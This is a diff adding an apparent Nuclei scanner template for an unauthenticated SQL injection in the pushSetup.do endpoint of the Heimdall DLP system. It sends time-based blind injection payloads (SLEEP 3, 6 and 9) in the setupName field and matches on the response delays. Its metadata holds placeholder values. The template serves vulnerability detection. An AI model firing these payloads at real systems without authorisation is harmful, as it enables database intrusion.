@@ -1,0 +1,57 @@
+id: Heimdall-DLP-pushSetup-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 虹安Heimdall DLP数据泄漏防护系统 pushSetup.do 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /dlp/userReg/pushSetup.do HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=4
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Length: 90
+
+        setupName={{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(3)))nxdq) AND 'vpUG'='vpUG)}}
+      - |-
+        POST /dlp/userReg/pushSetup.do HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=4
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Length: 90
+
+        setupName={{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(6)))nxdq) AND 'vpUG'='vpUG)}}
+      - |-
+        POST /dlp/userReg/pushSetup.do HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=4
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Content-Length: 90
+
+        setupName={{urlescape(1' AND (SELECT 6789 FROM (SELECT(SLEEP(9)))nxdq) AND 'vpUG'='vpUG)}}
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
